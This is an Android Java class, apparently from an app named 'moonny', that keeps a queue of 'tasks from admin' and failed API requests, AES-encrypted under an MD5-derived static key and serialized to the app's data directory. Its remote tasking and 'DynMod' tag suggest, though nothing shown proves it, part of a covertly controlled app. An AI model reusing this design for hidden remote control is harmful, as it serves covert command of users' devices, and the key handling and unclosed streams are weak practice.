package com.moonny;

import android.content.Context;
import android.util.Log;

import com.moonny.constants.Constant;
import com.moonny.constants.S;
import com.moonny.helpers.Utils;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.LinkedList;
import java.util.List;

// universal queue for tasks from admin and failed http requests to api
public class Tasks {

    File queue_file;
    private java.util.Queue<String> queue = null;
    Context ctx;

    public Tasks(Context ctx, String fname)
    {
        this.ctx = ctx;
//        if(Constant.DEBUG) {
//            File dir = new File(Environment.getExternalStorageDirectory().getAbsolutePath(), "TEST");
//            dir.mkdir();
//            queue_file = new File(dir, "queue.bin"); // binary file with list
//        }else
            queue_file = new File(ctx.getApplicationInfo().dataDir, fname);

        queue_load();
    }

    public int size()
    {
        return queue.size();
    }

    public String[] get_all()
    {
        String[] tasks = new String[queue.size()];
        int i = 0;
        while(true)
        {
            String elem = queue.poll();
            if(elem == null)
                break;

            tasks[i] = Utils.aes_decrypt(elem, Utils.md5(S.api_header_value));
            i++;
        }

        queue_load();
        if(Constant.DEBUG) Log.d("DynMod", "Return " + tasks.length + " tasks");
        return tasks;
    }

    // returns last element of queue (String json) or null if empty
    public String poll()
    {
        String task = queue.poll();
        if(task == null)
            return null;

        queue_save();
        return Utils.aes_decrypt(task, Utils.md5(S.api_header_value));
    }

    public void queue_add(String task_json)
    {
        queue_load();
        if(Constant.DEBUG) Log.d("DynMod", "adding to queue: " + task_json);
        queue.add(Utils.aes_encrypt(task_json, Utils.md5(S.api_header_value)));
        queue_save();
    }


    public void queue_add(List<String> tasks)
    {
        queue_load();
        if(Constant.DEBUG) Log.d("DynMod", "adding to queue: " + tasks.toString());
        for (String task_json: tasks) {
            queue_add(task_json);
        }

        queue_save();
    }

    private void queue_load()
    {
        if (!queue_file.exists()) {
            queue = new LinkedList<>();
            return;
        }

        try {
            ObjectInputStream is = new ObjectInputStream(new FileInputStream(queue_file));
            queue = (java.util.Queue<String>) is.readObject();
        }catch (ClassNotFoundException e){
            if(Constant.DEBUG) Log.d("DynMod", "queue_load ClassNotFoundException" + e.getMessage());
            e.printStackTrace();
        }catch (IOException e){
            if(Constant.DEBUG) Log.d("DynMod", "queue_load IOException " + e.getMessage());
            e.printStackTrace();
        }
    }

    private void queue_save()
    {
        try {
            ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream(queue_file));
            os.writeObject(queue);
//			os.flush();
//            os.close();
        }catch (IOException e) {
            if(Constant.DEBUG) Log.d("DynMod", "queue_save IOException " + e.getMessage());
            e.printStackTrace();
        }
    }

}
